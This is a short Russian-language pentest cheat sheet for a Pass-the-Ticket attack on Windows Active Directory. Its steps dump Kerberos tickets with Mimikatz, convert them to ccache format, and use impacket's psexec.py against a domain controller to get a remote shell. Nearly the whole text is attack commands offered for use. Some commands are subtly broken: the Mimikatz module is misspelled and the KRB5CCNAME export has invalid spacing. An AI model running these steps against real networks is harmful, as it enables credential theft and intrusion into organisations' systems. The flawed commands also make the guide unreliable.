# **Pass The Ticket (PTT)**

**Pass The Ticket (PTT) attack guide**

**Инструкция:**

- С помощью Mimikatz экспортируем тикеты.

`mimikatz # securlsa::tickets /export`

- Для удобства дальнейшей эксплуатации конвертируем в другой формат.

`python3 ticketConverter.py <kirbi_file> <output_file>`

- Получаем удаленный доступ к консоли атакуемой машины.

`# export KRB5CCNAME = <ccache_file>`

`# python3 psexec.py <domain.net>/<username>@<ip_of_dc>`


**Результат:**

Шелл на атакуемой машине.
